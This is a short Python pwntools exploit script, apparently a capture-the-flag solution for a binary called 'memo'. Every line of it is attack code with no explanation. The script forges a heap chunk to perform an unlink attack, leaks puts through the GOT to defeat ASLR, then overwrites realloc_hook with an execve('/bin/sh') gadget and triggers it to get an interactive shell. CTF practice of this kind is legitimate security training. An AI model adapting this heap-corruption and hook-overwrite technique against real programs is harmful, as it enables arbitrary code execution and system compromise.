from pwn import *

p = process ( './memo' )

realloc_hook_libc = 0x3a5608

excve_sh_libc = 0xd7117

puts_libc = 0x6b990

puts_got = 0x601fb8


def get_page ( ) :
    p.sendlineafter ( '6.exit\n' , '1' )
    p.recvuntil("On this page you write:\n")
    return p.recvuntil("Welcome to simple")[:-(len("Welcome to simple")+1)]

def change_name ( new_name ) :
    p.sendlineafter ( '6.exit\n' , '4' )
    p.recvuntil ( 'Input your new name:\n' )
    p.sendline( new_name )

def change_title ( new_title ) :
    p.sendlineafter ( '6.exit\n' , '5' )
    p.recvuntil ( 'Input your new title:\n' )
    p.sendline( new_title )

def change_page ( new_page ) :
    p.sendlineafter ( '6.exit\n' , '2' )
    p.recvuntil ( 'Input the new content of this page:\n' )
    p.sendline( new_page )

def tear_page ( size , new_page  ) :
    p.sendlineafter ( '6.exit\n' , '3' )
    p.sendlineafter ( 'Input the new page size (bytes):\n' , str ( size ) )
    p.sendlineafter('Input the new content of this page:\n' ,  new_page )

def main( ) :
    change_page( p64( 1 ) * 16 )
    tear_page( 512 , 'a' *512 )
    name = "A"*8+p64(0x20)+p64(0x602040-0x18)+p64(0x602040-0x10)+p64(0x20)+"\x40"
    change_name( name )
    tear_page( 256 , 'b' * 256)
    change_name ( 'a' * 16 + p64( puts_got ) + p64( 0x602028 ) ) #change pte_page to puts
    puts = u64(get_page().ljust(8,"\x00"))
    realloc_hook = puts - puts_libc + realloc_hook_libc
    excve_sh = puts - puts_libc + excve_sh_libc
    print 'puts:%x,realloc_hook :%x , excve_sh :%x' % (puts ,realloc_hook , excve_sh)
    change_name ( 'a' *16 + p64( realloc_hook ) + p64( 0x602028) )
    change_page( p64( excve_sh ) )
    #pause()
    p.sendlineafter ( '6.exit\n' , '3' )
    p.sendlineafter ( 'Input the new page size (bytes):\n' , '1024' )
    p.interactive()

if __name__ =='__main__' :
    main()
